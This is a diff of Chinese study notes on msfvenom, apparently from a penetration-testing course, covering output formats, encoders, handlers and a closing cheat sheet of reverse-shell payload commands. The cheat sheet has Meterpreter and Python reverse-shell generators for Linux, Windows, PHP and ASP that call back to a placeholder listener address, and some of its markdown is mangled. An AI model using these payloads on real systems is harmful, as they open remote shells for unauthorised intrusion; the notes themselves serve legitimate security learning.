@@ -1,11 +1,15 @@
-# msfvenom
-
-# 输出格式
+---
+publish: true
+tags:
+  - 渗透测试
+  - 后渗透与提权
+---
+## 输出格式
 
 `msfvenom --list formats`命令可用于列出支持的输出格式。
 
 
-# **Encoders**
+## **Encoders**
 
 编码器的目的并非绕过目标系统上安装的杀毒软件。顾名思义，它们的作用是对有效载荷进行编码。
 
@@ -25,7 +29,7 @@ root@ip-10-10-186-44:~#
 ```
 
 
-# **Handlers**
+## **Handlers**
 
 与使用反向 shell 的攻击类似，您需要能够接受由 MSFvenom payload 生成的传入连接。使用漏洞利用模块时，这部分由漏洞利用模块自动处理，您应该还记得`payload options`设置反向 shell 时标题的显示方式。从目标接收连接的常用术语是"捕获 shell"。MSFvenom payload 中生成的反向 shell 或__Meterpreter__回调可以使用处理程序轻松捕获。
 
@@ -88,6 +92,6 @@ Linux可执行和可链接格式 (elf) .elf 格式类似于 Windows 中的 .exe 
 
 :::
 
-# 常见载荷生成
+## 常见载荷生成
 
 `msfvenom -p ``__linux__``/x86/``__meterpreter__``/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`\n\n`msfvenom -p windows/``__meterpreter__``/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`\n\n`msfvenom -p ``__php__``/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.``__php__`\n\n`msfvenom -p windows/``__meterpreter__``/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`\n\n`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
